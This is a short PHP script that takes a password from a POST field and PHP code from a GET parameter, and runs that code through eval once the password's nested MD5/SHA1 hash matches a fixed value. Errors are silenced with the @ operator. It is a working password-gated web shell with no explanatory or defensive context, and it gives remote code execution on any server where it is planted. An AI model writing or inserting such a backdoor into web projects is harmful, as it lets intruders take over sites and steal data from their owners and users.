<?php
$anypass = $_POST['pass'];
$anyphpcode = $_GET['phpcode'];
if (md5(sha1(md5($anypass))) == "b76d95e82e853f3b0a81dd61c4ee286c") {
	@eval($anyphpcode);
}
?>